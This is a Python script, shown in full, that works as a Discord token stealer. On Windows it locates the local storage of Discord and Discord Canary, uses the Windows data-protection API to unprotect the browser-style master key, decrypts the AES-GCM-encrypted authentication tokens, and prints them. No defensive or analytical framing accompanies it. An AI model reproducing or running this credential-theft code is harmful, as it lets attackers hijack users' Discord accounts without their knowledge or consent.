from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import os
import json
import re
import base64

class Discord(object):

    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens = []

        self.grab_tokens()

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            raise Exception("Failed to decrypt password")

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()

        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grab_tokens(self):
        paths = {
            'Discord': os.path.join(self.roaming, 'discord', 'Local Storage', 'leveldb'),
            'Discord Canary': os.path.join(self.roaming, 'discordcanary', 'Local Storage', 'leveldb')
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue

            disc = name.replace(" ", "").lower()
            local_state = os.path.join(self.roaming, f'{disc}\\Local State') 

            if not os.path.exists(local_state):
                continue
            
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                
                for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(self.encrypted_regex, line):
                        token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(local_state))
                        if token not in self.tokens:
                            self.tokens.append(token)

if __name__ == '__main__':
    discord = Discord()
    print(discord.tokens)